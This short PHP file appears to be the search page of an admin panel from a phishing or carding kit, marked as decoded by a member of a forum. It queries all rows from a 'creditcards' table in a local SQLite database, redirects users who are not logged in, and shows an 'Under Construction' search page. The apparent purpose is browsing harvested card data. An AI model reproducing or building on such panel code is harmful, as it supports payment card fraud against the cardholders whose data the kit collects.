<?php
// Decoded by Girudatsu.com Member

$CHQdDLyBojxXV = 'header';
$pdo = new PDO('sqlite:database.db');
$creditcards = $pdo->query('SELECT * FROM `creditcards`')->fetchAll(PDO::FETCH_ASSOC);
@session_start();
if (!isset($_SESSION['login_success'])) {
    @header('Location: ../index.php');
    exit;
}
?>
<script src="js/search.min.js" type="text/javascript"></script>
<div id="title_1">Search: <br><center><img width="200px" src="img/roadblock.svg"><br><font color="#D91F2C">[<font color="#FFFFFF">Under Construction!</font>]</font></center></div>
